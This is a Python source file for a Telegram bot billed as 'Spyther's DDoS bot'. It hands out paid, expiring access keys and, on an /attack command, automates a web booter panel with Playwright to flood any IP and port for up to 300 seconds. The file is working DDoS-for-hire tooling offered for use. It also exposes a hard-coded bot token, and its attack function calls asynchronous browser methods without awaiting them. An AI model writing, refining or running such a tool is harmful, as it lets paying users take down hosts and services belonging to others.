import asyncio
import json
import time
import random
import string
from datetime import datetime, timedelta

from playwright.async_api import async_playwright
from telegram import Update
from telegram.error import RetryAfter, TelegramError
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "8030324408:AAG8btYkCUba0oW-nB_JxkaWJqz6KVCrdS8"
OWNER_ID = 5193826370

DB_FILE = "db.json"

# ---------------- DATABASE ---------------- #
def load_db():
    try:
        with open(DB_FILE) as f:
            return json.load(f)
    except Exception:
        return {"keys": {}, "users": {}}

def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2)

db = load_db()

# ---------------- GLOBAL STATE ---------------- #
attack_lock = asyncio.Lock()
attack_running = False
attack_end_time = 0.0
attack_info: dict = {}

# Playwright globals (sync for stability with long-lived browser)
playwright_instance = None
browser = None
page = None

# ---------------- PLAYWRIGHT (NON-BLOCKING) ---------------- #
async def init_playwright():
    global playwright_instance, browser, page
    playwright_instance = await async_playwright().start()
    browser = await playwright_instance.chromium.launch(headless=False)
    context = await browser.new_context()
    page = await context.new_page()
    await page.goto("https://satellitestress.st/attack")


def launch_attack_action(ip: str, port: str, duration: int) -> bool:
    """Run in executor - never blocks the event loop"""
    if not page:
        return False
    try:
        # Robust selectors (original name= changes after first attack → we use better fallbacks)
        # This prevents selector failures on subsequent attacks
        page.fill('input[placeholder*="IP"], input[name*="ip"], input[type="text"]', ip)
        page.fill('input[placeholder*="Port"], input[name*="port"]', port)
        page.fill('input[placeholder*="Time"], input[name*="time"], input[placeholder*="60"]', str(duration))
        
        page.get_by_role("button", name="Launch", exact=False).click(timeout=5000)
        print(f"🚀 Attack launched via panel → {ip}:{port} for {duration}s")
        return True
    except Exception as e:
        print(f"⚠️ Playwright action failed: {e}")
        return False


# ---------------- SAFE MESSAGE EDIT (CRITICAL FOR STABILITY) ---------------- #
async def safe_edit(msg, text: str, max_retries: int = 5):
    """Edits the SAME message. Retries silently on any Telegram error/flood."""
    for attempt in range(max_retries):
        try:
            await msg.edit_text(text)
            return True
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.1)  # respect Telegram flood control
        except TelegramError as e:
            err_str = str(e).lower()
            if "flood" in err_str or "too many" in err_str or "retry" in err_str:
                await asyncio.sleep(2 ** attempt)  # exponential backoff
            elif "not modified" in err_str or "message is not modified" in err_str:
                return True  # already up to date
            else:
                await asyncio.sleep(1)
        except Exception:
            # Any other error (message deleted, etc.) → silent retry
            await asyncio.sleep(1)
    return False  # failed after retries, countdown continues anyway


# ---------------- COUNTDOWN TASK (background + ultra stable) ---------------- #
async def countdown_task(status_msg, ip: str, port: str, duration: int):
    global attack_running, attack_end_time
    attack_end_time = time.time() + duration

    try:
        while True:
            remaining = max(0, int(attack_end_time - time.time()))

            text = f"""🚀 Attack Started

ip : {ip}
port : {port}
time : {duration}

Remaining time: {remaining}s"""

            await safe_edit(status_msg, text)

            if remaining <= 0:
                break

            await asyncio.sleep(1.0)  # precise 1-second ticks

        # Final message (same message edited)
        final_text = f"""✅ Attack Finished

ip : {ip}
port : {port}
time : {duration}"""
        await safe_edit(status_msg, final_text)

    finally:
        attack_running = False


# ---------------- UTILS ---------------- #
def gen_key(days: int) -> str:
    rand = ''.join(random.choices(string.digits, k=8))
    key = f"SPYTHER-KEY{rand}"
    expire = (datetime.now() + timedelta(days=days)).timestamp()
    db["keys"][key] = expire
    save_db()
    return key


def authorised(user_id: int) -> bool:
    user_id_str = str(user_id)
    if user_id_str not in db["users"]:
        return False
    if time.time() > db["users"][user_id_str]:
        db["users"].pop(user_id_str, None)
        save_db()
        return False
    return True


# ---------------- COMMANDS ---------------- #
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Spyther's DDoS bot\n\nUse /help to see available commands"
    )


async def helpcmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
📜 Available Commands

/attack ip port time
/redeem key
/when

Owner:
/gen days
/users
"""
    await update.message.reply_text(msg)


async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not an owner")
        return

    try:
        days = int(context.args[0])
        key = gen_key(days)
        await update.message.reply_text(
            f"🔑 Key Generated\n\n{key}\n\nValid for {days} days"
        )
    except Exception:
        await update.message.reply_text("Usage: /gen <days>")


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        key = context.args[0]
        if key not in db["keys"]:
            await update.message.reply_text("❌ Invalid key")
            return

        expire = db["keys"][key]
        user_id = str(update.effective_user.id)
        db["users"][user_id] = expire
        del db["keys"][key]
        save_db()

        days = int((expire - time.time()) / 86400)
        await update.message.reply_text(
            f"✅ Access Activated\n\nValid for {days} days"
        )
    except Exception:
        await update.message.reply_text("Usage: /redeem <key>")


async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not an owner")
        return

    msg = "👥 Authorised Users\n\n"
    for u in db["users"]:
        remain = int((db["users"][u] - time.time()) / 86400)
        msg += f"{u} : {remain} days left\n"

    await update.message.reply_text(msg)


async def when(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running, attack_end_time
    if not attack_running:
        await update.message.reply_text("No attack running")
        return

    remaining = max(0, int(attack_end_time - time.time()))
    await update.message.reply_text(
        f"⏱ Remaining Time : {remaining}s\n"
        f"Target: {attack_info.get('ip', 'N/A')}:{attack_info.get('port', 'N/A')}"
    )


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running, attack_info

    if not authorised(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorised")
        return

    async with attack_lock:
        if attack_running:
            await update.message.reply_text(
                "⚠️ An attack is already running\nUse /when to see remaining time"
            )
            return

        try:
            ip = context.args[0]
            port = context.args[1]
            duration = int(context.args[2])

            if not (1 <= duration <= 300):
                await update.message.reply_text("❌ Time must be between 1-300 seconds")
                return

            # === REQUIREMENT 10: Reply BEFORE any attack process ===
            status_msg = await update.message.reply_text(
                f"""🚀 Attack Started

ip : {ip}
port : {port}
time : {duration}

Remaining time: {duration}s"""
            )

            # Mark as running (protected by lock)
            attack_running = True
            attack_info = {"ip": ip, "port": port, "time": duration}

            # === NON-BLOCKING Playwright ===
            success = await asyncio.to_thread(launch_attack_action, ip, port, duration)

            if not success:
                await status_msg.edit_text("❌ Failed to launch attack on panel")
                attack_running = False
                return

            # === Start ultra-stable countdown in background task ===
            asyncio.create_task(countdown_task(status_msg, ip, port, duration))

        except Exception:
            attack_running = False
            await update.message.reply_text("Usage: /attack <ip> <port> <time>")


# ---------------- MAIN ---------------- #
async def main():
    # Initialize Playwright BEFORE starting bot
    await init_playwright()

    app = (
        ApplicationBuilder()
        .token(TOKEN)
        .concurrent_updates(10)          # Allow multiple commands while countdown runs
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", helpcmd))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("when", when))
    app.add_handler(CommandHandler("attack", attack))

    print("🚀 Spyther DDoS Bot started (production stable version)")
    await app.run_polling()


if __name__ == "__main__":
    asyncio.run(main())